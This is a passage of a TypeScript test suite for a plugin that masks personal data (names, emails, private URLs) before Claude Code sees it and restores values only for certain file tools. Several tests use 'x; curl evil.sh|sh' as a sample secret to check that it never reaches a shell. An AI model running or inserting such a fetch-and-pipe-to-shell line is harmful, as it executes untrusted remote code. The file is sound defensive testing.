// SPDX-License-Identifier: Apache-2.0
//
// The mod against a fake sidecar that masks `John` and `john@acme.io`,
// answered from the `http.fetch` stub. No model, tool or network runs.

import { expect, mock, test } from 'claude-code/testing';
import {
  CATEGORY_SHORT_NAMES,
  PII_COMMANDS,
  applyPiiCommand,
  piiCommandDescription,
} from '../hooks/categories.ts';
import { PADLOCK_COLUMNS, padlockCells } from '../hooks/padlock.ts';
import {
  expectedProof,
  hmacSha256Hex,
  olderRelease,
  readSidecarSelf,
  sidecarOrigin,
} from '../hooks/policy.ts';

const TOKEN = 't'.repeat(64);
/** The fake sidecar's one session prefix, as nullpii mints them. */
const PREFIX = '0123456789abcdef';
/** A placeholder as the fake sidecar mints it. */
const ph = (label: string, index: number) => `{{PII_${label}_${index}_${PREFIX}}}`;
const POLICY_FILE = '/home/node/.config/nullpii/config.json';
const DEFAULT_RESTORE_TOOLS = [
  'Read',
  'Edit',
  'MultiEdit',
  'Write',
  'NotebookEdit',
  'Grep',
  'Glob',
];
const SECRETS: ReadonlyArray<[RegExp, string]> = [
  [/john@acme\.io/g, 'EMAIL'],
  [/\bJohn\b/g, 'PERSON'],
  [/Mary Ann/g, 'PERSON'],
  [/x; curl evil\.sh\|sh/g, 'SECRET'],
  [/https:\/\/docs\.acme\.io\/\S*/g, 'PRIVATE_URL'],
];

const SECRET_HEADER = 'x-nullpii-session-secret';
const PLACEHOLDER_ANY = /\{\{PII_[A-Z_]+?_\d+_[0-9a-f]{16}\}\}/g;
/** Shell tools, as the gateway names them: their input gets no value. */
const SHELL_TOOLS = [
  'Bash',
  'bash',
  'shell',
  'PowerShell',
  'exec_command',
  'shell_command',
  'write_stdin',
];
const SESSIONS_PREFIX = '/v1/sidecar/sessions/';
const MODEL_REVISION = 'a'.repeat(40);

/** A stand-in for nullpii-gateway's sidecar routes, with one vault.
 * Sessions carry secrets as the gateway's do: handed out once on
 * creation, required on every later call. `liveKeys` are sessions some
 * earlier module instance opened, whose secrets this mod does not have. */
function fakeSidecar(
  opts: {
    down?: boolean;
    restoreTools?: string[];
    liveKeys?: string[];
    /** Answer the challenge as a process without the token would. */
    impostor?: boolean;
    /** The policy file the status reports. */
    policyFile?: string;
    /** The mode of each category the status reports. */
    categories?: Record<string, string>;
    /** What the mod's plugin store holds at the start. */
    stored?: Record<string, unknown>;
  } = {},
) {
  let restoreTools = opts.restoreTools ?? DEFAULT_RESTORE_TOOLS;
  const vault = new Map<string, string>();
  const sessions = new Map<string, string>(
    (opts.liveKeys ?? []).map((key) => [key, 'someone-else']),
  );
  let minted = 0;
  const calls: string[] = [];
  /** Challenges answered, and whether each request carried the token. */
  const challenges: string[] = [];
  const tokensSent: boolean[] = [];
  /** `host:port` of every request, wherever it was sent. */
  const hosts: string[] = [];
  const secretsSent: Array<string | undefined> = [];
  const restoreBodies: string[] = [];
  const sanitizeBodies: string[] = [];
  /** Set it to make `/sanitize` and `/restore` answer this text, not JSON.
   * Set `startup` to make the status answer that field, as a gateway does
   * while its model warms up (absent: a gateway that reports none). */
  const state: {
    garbage?: string;
    startup?: unknown;
    down?: boolean;
    status?: Record<string, unknown>;
    failSanitize?: boolean;
    failDelete?: boolean;
    previewAnswer?: unknown;
    /** Answer a shutdown request as a sidecar with a session in use does. */
    refuseShutdown?: boolean;
  } = {};
  // The policy the status reports, which a PUT replaces as the gateway does,
  // with a version that changes with it.
  const policy = {
    config: {} as Record<string, unknown>,
    categories: opts.categories ?? {},
    revision: 0,
  };
  const version = () => `v${policy.revision}`;
  /** Replace the policy as `PUT /v1/sidecar/policy` does. */
  const replacePolicy = (config: Record<string, unknown>) => {
    policy.config = config;
    policy.categories = {
      ...policy.categories,
      ...((config.categories as Record<string, string> | undefined) ?? {}),
    };
    restoreTools = (config.restoreTools as string[] | undefined) ?? DEFAULT_RESTORE_TOOLS;
    policy.revision += 1;
  };
  const policyBodies: unknown[] = [];
  /** Every `$.ui.log` line the mod wrote. */
  const logs: string[] = [];
  /** Every toast the mod showed. */
  const toasts: string[] = [];
  /** The status of every answer. */
  const statuses: number[] = [];
  let next = 0;
  const maskString = (s: string, byLabel: Record<string, number>) => {
    let out = s;
    for (const [re, label] of SECRETS) {
      out = out.replace(re, (m) => {
        const placeholder = ph(label, next++);
        vault.set(placeholder, m);
        byLabel[label] = (byLabel[label] ?? 0) + 1;
        return placeholder;
      });
    }
    return out;
  };
  const walk = (v: unknown, f: (s: string) => string): unknown => {
    if (typeof v === 'string') return f(v);
    if (Array.isArray(v)) return v.map((x) => walk(x, f));
    if (v !== null && typeof v === 'object') {
      return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, walk(x, f)]));
    }
    return v;
  };
  const respond = (status: number, body: unknown) => {
    statuses.push(status);
    return answer(status, body);
  };
  const answer = (status: number, body: unknown) => ({
    value: {
      status,
      ok: status < 300,
      headers: {},
      text: body === undefined ? '' : JSON.stringify(body),
    },
  });
  const handler = async (
    $: unknown,
    e: { url: string; init?: { method?: string; body?: string; headers?: Record<string, string> } },
  ) => {
    const method = e.init?.method ?? 'GET';
    const url = new URL(e.url);
    const path = url.pathname;
    if (opts.down || state.down) return { deny: 'connect ECONNREFUSED 127.0.0.1:8787' };
    tokensSent.push(e.init?.headers?.authorization !== undefined);
    if (path === '/v1/sidecar/challenge') {
      const { nonce } = JSON.parse(e.init?.body ?? '{}') as { nonce: string };
      challenges.push(nonce);
      const proof = await expectedProof(opts.impostor ? 'f'.repeat(64) : TOKEN, nonce);
      return answer(200, { proof });
    }
    calls.push(`${method} ${path}`);
    hosts.push(url.host);
    if (state.garbage !== undefined && /\/(sanitize|restore)$/.test(path)) {
      return { value: { status: 200, ok: true, headers: {}, text: state.garbage } };
    }
    if (e.init?.headers?.authorization !== `Bearer ${TOKEN}`)
      return respond(401, { error: 'unauthorized' });
    // Fastify refuses a JSON content type with an empty body.
    if (e.init?.headers?.['content-type'] === 'application/json' && !e.init.body)
      return respond(400, { error: 'empty_json_body' });
    const presented = e.init?.headers?.[SECRET_HEADER];
    if (path.startsWith(SESSIONS_PREFIX)) {
      secretsSent.push(presented);
      const key = decodeURIComponent(path.slice(SESSIONS_PREFIX.length).split('/')[0] ?? '');
      const secret = sessions.get(key);
      if (method === 'PUT' && secret === undefined) {
        const created = `secret-${minted++}`;
        sessions.set(key, created);
        return respond(201, { status: 'created', secret: created });
      }
      if (method === 'PUT') {
        return presented === secret
          ? respond(200, { status: 'exists' })
          : respond(409, { error: 'session_exists' });
      }
      if (secret === undefined) return respond(404, { error: 'session_not_found' });
      if (presented !== secret) return respond(403, { error: 'bad_session_secret' });
      if (method === 'DELETE') {
        if (state.failDelete && key.startsWith('try-')) {
          return respond(500, { error: 'close failed' });
        }
        sessions.delete(key);
        return respond(204, undefined);
      }
    }
    const policyView = () => ({
      version: version(),
      file: opts.policyFile ?? POLICY_FILE,
      loaded: true,
      config: policy.config,
      categories: policy.categories,
      restoreTools,
    });
    if (path === '/v1/sidecar/shutdown' && method === 'POST') {
      if (state.refuseShutdown) return respond(409, { error: 'sessions_active', sessions: 1 });
      // The process is gone once it has answered: nothing is at the address.
      state.down = true;
      return respond(202, { status: 'closing' });
    }
    if (path === '/v1/sidecar/status') {
      return respond(200, {
        status: 'ok',
        sessions: 1,
        gatewayVersion: '0.5.4',
        nullpiiVersion: '0.5.4',
        backend: 'cpu',
        model: { revision: MODEL_REVISION, filesPinned: true },
        policy: policyView(),
        ...(state.startup !== undefined && { startup: state.startup }),
        ...state.status,
      });
    }
    // As the gateway: a call naming an older policy version does nothing.
    const seen = e.init?.headers?.['x-nullpii-policy-version'];
    const versioned = /\/(sanitize|restore)$/.test(path) || path === '/v1/sidecar/policy';
    if (versioned && seen !== undefined && seen !== version()) {
      return respond(412, { error: 'policy_changed', version: version() });
    }
    if (path === '/v1/sidecar/policy' && method === 'PUT') {
      const { config } = JSON.parse(e.init?.body ?? '{}') as { config: Record<string, unknown> };
      policyBodies.push(config);
      replacePolicy(config);
      return respond(200, { status: 'ok', policy: policyView() });
    }
    const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown; tool?: string };
    if (path.endsWith('/restore')) restoreBodies.push(e.init?.body ?? '');
    if (path.endsWith('/sanitize')) {
      const preview = path.startsWith(`${SESSIONS_PREFIX}try-`);
      sanitizeBodies.push(e.init?.body ?? '');
      if (preview && state.previewAnswer !== undefined) return respond(200, state.previewAnswer);
      if (preview && state.failSanitize) return respond(500, { error: 'failure quoting John' });
      const byLabel: Record<string, number> = {};
      const value = walk(body.value, (s) => maskString(s, byLabel));
      const captured = Object.values(byLabel).reduce((a, b) => a + b, 0);
      const capturedByLabel = preview
        ? Object.fromEntries(
            Object.entries(byLabel).map(([label, n]) => [
              label === 'SECRET'
                ? 'secret'
                : label === 'PRIVATE_URL'
                  ? 'private_url'
                  : `private_${label.toLowerCase()}`,
              n,
            ]),
          )
        : byLabel;
      return respond(200, { value, captured, capturedByLabel });
    }
    const counts = {
      replacementsByLabel: {},
      unknownPlaceholders: 0,
      foreignPlaceholders: 0,
    };
    // As the gateway: a shell tool's input gets no value, and its
    // placeholders are listed so the mod refuses the call.
    if (SHELL_TOOLS.includes(body.tool ?? '')) {
      const kept = [...new Set(JSON.stringify(body.value).match(PLACEHOLDER_ANY) ?? [])];
      return respond(200, { value: body.value, replacements: 0, ...counts, shellKeptMasked: kept });
    }
    if (body.tool !== undefined && !restoreTools.includes(body.tool)) {
      const held = JSON.stringify(body.value).match(PLACEHOLDER_ANY);
      return respond(200, {
        value: body.value,
        replacements: 0,
        ...counts,
        heldForTool: held?.length ?? 0,
      });
    }
    let replacements = 0;
    const value = walk(body.value, (s) =>
      s.replace(PLACEHOLDER_ANY, (placeholder) => {
        const real = vault.get(placeholder);
        if (real === undefined) return placeholder;
        replacements += 1;
        return real;
      }),
    );
    return respond(200, { value, replacements, ...counts });
  };
  return {
    handler,
    /** A policy change this mod did not make (a command with the token). */
    replacePolicy,
    stored: opts.stored ?? {},
    calls,
    challenges,
    hosts,
    logs,
    toasts,
    restoreBodies,
    sanitizeBodies,
    policyBodies,
    secretsSent,
    sessions,
    state,
    statuses,
    tokensSent,
  };
}

function stubSession(
  on,
  sidecar: ReturnType<typeof fakeSidecar>,
  env: Record<string, string> = { NULLPII_SIDECAR_TOKEN: TOKEN },
  cwd = '/work',
) {
  /** The commands the mod registered, as the host would list them. */
  const registered: { name: string; description: string; argumentHint?: string }[] = [];
  mock.env(on, env);
  mock.store(on, sidecar.stored);
  on('session.start', () => ({ cwd }));
  on('session.cwd', () => ({ value: cwd }));
  on('command.register', ($, e) => {
    registered.push(e);
    return { value: undefined };
  });
  on('session.id', () => ({ value: 'session-1' }));
  on('ui.toast', ($, e) => {
    sidecar.toasts.push(e.text);
    return { value: undefined };
  });
  on('ui.log', ($, e) => {
    sidecar.logs.push(e.text);
    return { value: undefined };
  });
  on('http.fetch', sidecar.handler);
  return { registered };
}

async function start($) {
  await $.session.start({ surface: 'terminal', isInteractive: true, cwd: '/work' });
}

const COMPOSER = { kind: 'composer' } as const;

/** A `/pii` command as the person's own typed run reaches `command.run`:
 * the engine stamps the origin of a command typed at the prompt, and with
 * it the mod's person-only guard lets a pause through. The test kit passes
 * on the origin a test gives it, so a test runs what a typed command runs. */
function typed(name: string, args: string) {
  return { command: name, args, origin: COMPOSER };
}

test('a prompt reaches Claude with placeholders, and the sidecar session is opened', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(seen.length).toBe(1);
  expect(seen[0]).not.toContain('John');
  expect(seen[0]).not.toContain('john@acme.io');
  // The sidecar's release is read before the session opens on it.
  expect(sidecar.calls[0]).toBe('GET /v1/sidecar/status');
  expect(sidecar.calls[1]).toBe('PUT /v1/sidecar/sessions/session-1');
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: on');
});

test('a tool result is masked and returned as a fresh result, without core ref', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'owner: John', stderr: '' },
    ref: 7,
    text: 'owner: John',
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(JSON.stringify(out)).not.toContain('John');
  expect(out.ref).toBeUndefined();
  expect(out.text).toBeUndefined();
});

/** The sanitize request bodies of `sidecar`, parsed. */
function sanitized(sidecar: ReturnType<typeof fakeSidecar>) {
  return sidecar.sanitizeBodies.map(
    (body) => JSON.parse(body) as { value: { stdout?: string }; keys?: boolean },
  );
}

test('a tool result keeps its keys when the sidecar says it can take that', async ($, on) => {
  const sidecar = fakeSidecar();
  sidecar.state.status = { features: { sanitizeKeys: true, shutdown: false } };
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: 'owner: John', code: 200 }, text: 'x' }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(JSON.stringify(out)).not.toContain('John');
  expect(sanitized(sidecar).find((b) => b.value.stdout !== undefined)?.keys).toBe(false);
});

test('a tool result is sent as before to a sidecar that does not say it can keep keys', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: 'owner: John', code: 200 }, text: 'x' }));
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  const body = sanitized(sidecar).find((b) => b.value.stdout !== undefined);
  expect(body).toBeDefined();
  expect(body).not.toHaveProperty('keys');
});

test('a prompt is masked with its keys, whatever the sidecar can do', async ($, on) => {
  const sidecar = fakeSidecar();
  sidecar.state.status = { features: { sanitizeKeys: true, shutdown: false } };
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sanitized(sidecar).every((b) => b.keys === undefined)).toBe(true);
});

/** A session start on a sidecar that reports `status`, with a stand-in for
 * the pinned sidecar the mod starts if it makes room, and what it started. */
function startAgainst(
  $,
  on,
  status: Record<string, unknown>,
  state: { refuseShutdown?: boolean } = {},
) {
  const { sidecar } = beforeStart($, on, { down: false });
  sidecar.state.status = status;
  Object.assign(sidecar.state, state);
  const spawned: string[][] = [];
  on('process.spawn', async function* ($, e) {
    spawned.push(e.argv);
    await new Promise<never>(() => undefined);
  });
  return { sidecar, spawned };
}

const IDLE_OLDER = { gatewayVersion: '0.5.2', sessions: 0 };
const CAN_SHUTDOWN = { sanitizeKeys: true, shutdown: true };

test('an idle sidecar of an older release is stopped, and the pinned release is started', async ($, on) => {
  const { sidecar, spawned } = startAgainst($, on, { ...IDLE_OLDER, features: CAN_SHUTDOWN });
  await start($);
  expect(sidecar.calls).toContain('POST /v1/sidecar/shutdown');
  expect(spawned.length).toBe(1);
  expect(spawned[0]).toContain('@lbroth/nullpii-gateway@0.5.4');
});

test('an older sidecar with a session open is left running', async ($, on) => {
  const { sidecar, spawned } = startAgainst($, on, {
    ...IDLE_OLDER,
    sessions: 1,
    features: CAN_SHUTDOWN,
  });
  await start($);
  expect(sidecar.calls).not.toContain('POST /v1/sidecar/shutdown');
  expect(spawned.length).toBe(0);
});

test('an older sidecar that refuses to stop is kept, and the session opens on it', async ($, on) => {
  const { sidecar, spawned } = startAgainst(
    $,
    on,
    { ...IDLE_OLDER, features: CAN_SHUTDOWN },
    { refuseShutdown: true },
  );
  await start($);
  expect(sidecar.calls).toContain('POST /v1/sidecar/shutdown');
  expect(sidecar.calls).toContain('PUT /v1/sidecar/sessions/session-1');
  expect(spawned.length).toBe(0);
});

test('an older sidecar with no shutdown route is left to the doctor', async ($, on) => {
  const { sidecar, spawned } = startAgainst($, on, IDLE_OLDER);
  await start($);
  expect(sidecar.calls).not.toContain('POST /v1/sidecar/shutdown');
  expect(spawned.length).toBe(0);
});

test('a sidecar of the pinned release is never stopped', async ($, on) => {
  const { sidecar, spawned } = startAgainst($, on, {
    gatewayVersion: '0.5.4',
    sessions: 0,
    features: CAN_SHUTDOWN,
  });
  await start($);
  expect(sidecar.calls).not.toContain('POST /v1/sidecar/shutdown');
  expect(spawned.length).toBe(0);
});

test('releases compare by number, and anything else is not older', () => {
  expect(olderRelease('0.5.3', '0.5.4')).toBe(true);
  expect(olderRelease('0.5.10', '0.5.4')).toBe(false);
  expect(olderRelease('0.4.9', '0.5.0')).toBe(true);
  expect(olderRelease('0.5.4', '0.5.4')).toBe(false);
  expect(olderRelease('1.0.0', '0.9.9')).toBe(false);
  expect(olderRelease('0.5.3-rc.1', '0.5.4')).toBe(true);
  expect(olderRelease(undefined, '0.5.4')).toBe(false);
  expect(olderRelease('latest', '0.5.4')).toBe(false);
});

test('a status that reports no features is an older sidecar', () => {
  expect(readSidecarSelf({ status: 'ok', sessions: 0 })).toEqual({
    sanitizeKeys: false,
    shutdown: false,
    gatewayVersion: undefined,
    sessions: 0,
  });
  expect(readSidecarSelf('nope').sanitizeKeys).toBe(false);
  expect(readSidecarSelf({ features: { sanitizeKeys: 'yes', shutdown: 1 } })).toMatchObject({
    sanitizeKeys: false,
    shutdown: false,
  });
});

test('a result whose attached context holds personal data is withheld, since context cannot be masked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'done', stderr: '' },
    context: ['owner: John <john@acme.io>'],
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'make' });
  expect(out.deny).toMatch(/withheld this tool's result/);
  expect(JSON.stringify(out)).not.toContain('John');
});

test('a context without personal data is passed on whole, beside the masked result', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'built for John', stderr: '' },
    context: ['lint: 0 warnings'],
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'make' });
  expect(out.context).toEqual(['lint: 0 warnings']);
  expect(JSON.stringify(out.result)).not.toContain('John');
});

test('placeholders in a local tool call get their real values back before it runs', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const written: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    written.push(e.content);
    return { result: 'wrote notes.md, contact john@acme.io' };
  });
  await start($);
  await $.prompt.submit({ text: 'note john@acme.io', wait: false, origin: COMPOSER });
  const placeholder = ph('EMAIL', 0);
  const out = await $.tool.call({
    tool: 'Write',
    file_path: 'notes.md',
    content: `Contact: ${placeholder}`,
  });
  expect(written).toEqual(['Contact: john@acme.io']);
  expect(JSON.stringify(out)).not.toContain('john@acme.io');
});

test('a call with nothing to restore is passed on as Claude wrote it', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const received: unknown[] = [];
  on('tool.call', ($, e) => {
    received.push(e);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(received.length).toBe(1);
  expect((received[0] as { command: string }).command).toBe('ls');
});

test('a tool that sends data elsewhere keeps the placeholders', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const urls: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    urls.push(e.url);
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({
    tool: 'WebFetch',
    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
    prompt: 'x',
  });
  expect(urls).toEqual([`https://example.com/?q=${ph('EMAIL', 0)}`]);
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain('Placeholders kept in calls to other tools: 1');
});

test('an errored tool result reaches Claude masked, as a refusal', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ isError: true, result: 'boom', text: 'no such user John' }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'id' });
  expect(typeof out.deny).toBe('string');
  expect(out.deny).not.toContain('John');
});

test(
  'with the sidecar down, a prompt is handed back and a tool call is refused',
  { options: { autostart: false } },
  async ($, on) => {
    const sidecar = fakeSidecar({ down: true });
    stubSession(on, sidecar);
    const ran: string[] = [];
    on('prompt.submit', ($, e) => ({ text: e.text }));
    on('tool.call', ($, e) => {
      ran.push(e.tool);
      return { result: 'ok' };
    });
    await start($);
    const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
    expect(prompt.drop).toMatch(/nullpii could not mask this prompt/);
    const call = await $.tool.call({ tool: 'Bash', command: 'ls' });
    expect(call.deny).toMatch(/nullpii could not prepare this tool call/);
    expect(ran).toEqual([]);
    const status = await $.command.run({ command: 'pii', args: '' });
    expect(status.text).toContain('Status: blocking (nullpii-gateway did not answer');
  },
);

test('the system prompt says what the placeholders are and which tools get values', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: ['Read', 'Write'] });
  stubSession(on, sidecar);
  on('prompt.compose', () => ({
    sections: [{ id: 'intro', text: 'You are Claude Code.', scope: 'shared' }],
  }));
  await start($);
  const { sections } = await $.prompt.compose({
    model: 'claude-test',
    promptModel: 'claude-test',
    surfaces: ['terminal'],
    tools: ['Read', 'Write', 'Bash'],
    outputStyle: null,
    traits: [],
  });
  expect(sections.map((s) => s.id)).toEqual(['intro', 'nullpii:placeholders']);
  expect(sections[1].scope).toBe('session');
  expect(sections[1].text).toContain('put the real values back before they run: Read, Write.');
  expect(sections[1].text).toContain('Do not ask the user for the real value');
});

test('without a token, the mod blocks instead of sending data unmasked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {});
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  const prompt = await $.prompt.submit({ text: 'hello', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/no sidecar token/);
});

const BAND = {
  plugin: 'nullpii',
  component: 'AbovePrompt',
  requestId: 'above-prompt',
  surface: 'terminal',
  viewport: { columns: 100, rows: 30 },
  props: {
    hasSurvey: false,
    isWorking: false,
    maxRows: 4,
    bodyColumns: 100,
    scroll: { offset: 0, bodyRows: 4 },
    view: {},
  },
} as const;

test('while nullpii is on and nothing needs saying, the mod draws nothing above the prompt', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by another mod'] }));
  await start($);
  await $.prompt.submit({ text: 'John, john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(BAND);
  // No row of the mod's: no padlock, no toggle, no line of its own. The
  // state is in the line under the prompt, counts and all.
  expect(await ui.find({ type: 'Raster', key: 'nullpii-lock' })).toBeUndefined();
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  expect(await ui.find({ type: 'Text', text: /masked/ })).toBeUndefined();
  // What another mod drew there stands.
  expect(await ui.find({ type: 'Text', text: 'drawn by another mod' })).toBeDefined();
  await ui.unmount();
});

test('a band drawn before the session opens goes away once it opens', async ($, on) => {
  // As after a hot reload: the band is drawn at once, with the module's
  // starting state (no token, so the mod is blocking), and session.start
  // opens the session afterwards.
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  const ui = await $.ui.mount(BAND);
  expect(await ui.find({ type: 'Text', text: /^blocking/ })).toBeDefined();
  await start($);
  expect(await ui.find({ type: 'Text', text: /^blocking/ })).toBeUndefined();
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  await ui.unmount();
});

test(
  'the band turns into a warning when the mod is blocking',
  { options: { autostart: false } },
  async ($, on) => {
    const sidecar = fakeSidecar({ down: true });
    stubSession(on, sidecar);
    on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
    await start($);
    const ui = await $.ui.mount(BAND);
    const line = await ui.find({ type: 'Text', text: /^blocking · the sidecar does not answer/ });
    expect(line).toBeDefined();
    expect(line?.props.color).toBe('red');
    await ui.unmount();
  },
);

function messageSite(text: string) {
  return {
    plugin: 'nullpii',
    component: 'AssistantMessage',
    requestId: 'msg-1',
    surface: 'terminal',
    viewport: { columns: 100, rows: 30 },
    props: { text, isFirstOfReply: true },
  } as const;
}

test("Claude's reply is drawn with real values, while Claude keeps the placeholders", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  await $.prompt.submit({ text: 'write to john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(messageSite(`Sent the draft to ${ph('EMAIL', 0)}.`));
  expect(await ui.find({ type: 'Text', text: 'Sent the draft to john@acme.io.' })).toBeDefined();
  await ui.unmount();
});

test('a reply without placeholders is drawn without asking the sidecar', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  const before = sidecar.calls.length;
  const ui = await $.ui.mount(messageSite('All tests pass.'));
  expect(await ui.find({ type: 'Text', text: 'All tests pass.' })).toBeDefined();
  expect(sidecar.calls.length).toBe(before);
  await ui.unmount();
});

test('an @-mentioned file reaches Claude masked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  await start($);
  const out = await $.prompt.attachment({
    type: 'file',
    text: 'owners: John <john@acme.io>',
    origin: { kind: 'engine' },
  });
  expect(out.text).not.toContain('John');
  expect(out.text).not.toContain('john@acme.io');
});

test("the first message's context reaches Claude masked", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const out = await $.prompt.context({
    blocks: [
      { name: 'userEmail', text: 'john@acme.io' },
      { name: 'currentDate', text: '2026-10-17' },
    ],
    instructionFiles: [],
  });
  expect(JSON.stringify(out.blocks)).not.toContain('john@acme.io');
  expect(out.blocks.map((b) => b.name)).toEqual(['userEmail', 'currentDate']);
});

test(
  'with the sidecar down, attachments are left out and the context is emptied',
  { options: { autostart: false } },
  async ($, on) => {
    const sidecar = fakeSidecar({ down: true });
    stubSession(on, sidecar);
    on('prompt.attachment', ($, e) => ({ text: e.text }));
    on('prompt.context', ($, e) => ({ blocks: e.blocks }));
    await start($);
    const attachment = await $.prompt.attachment({
      type: 'file',
      text: 'John',
      origin: { kind: 'engine' },
    });
    expect(attachment.text).toBe(null);
    const context = await $.prompt.context({
      blocks: [{ name: 'userEmail', text: 'john@acme.io' }],
    });
    expect(context.blocks).toEqual([]);
  },
);

test('/pii reports counts by type, never values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'John and John, john@acme.io', wait: false, origin: COMPOSER });
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain('Masked before Claude read them: 3');
  expect(answer.text).toContain('PERSON 2 · EMAIL 1');
  expect(answer.text).not.toContain('John');
});

test('no shell command gets a real value: the call is refused, naming the placeholder', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  const out = await $.tool.call({ tool: 'Bash', command: `echo ${ph('SECRET', 0)}` });
  expect(out.deny).toContain(`no real value into a shell command (${ph('SECRET', 0)})`);
  expect(out.deny).toContain('Grep, Read, Edit or Write');
  expect(out.deny).not.toContain('curl');
  expect(ran).toEqual([]);
});

test('inside single quotes the same value is refused too', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  const out = await $.tool.call({
    tool: 'Bash',
    command: `printf '%s' '${ph('SECRET', 0)}' > token.txt`,
  });
  expect(out.deny).toContain(`no real value into a shell command (${ph('SECRET', 0)})`);
  expect(ran).toEqual([]);
});

test('a commit message with a name is refused too: no value goes into any shell command', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'write to Mary Ann', wait: false, origin: COMPOSER });
  const out = await $.tool.call({
    tool: 'Bash',
    command: `git commit -F - <<'EOF'\nThanks ${ph('PERSON', 0)}\nEOF`,
  });
  expect(out.deny).toContain(`no real value into a shell command (${ph('PERSON', 0)})`);
  expect(ran).toEqual([]);
});

test('each restore names its tool, and sends only the arguments that can take values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.prompt.submit({ text: 'Mary Ann', wait: false, origin: COMPOSER });
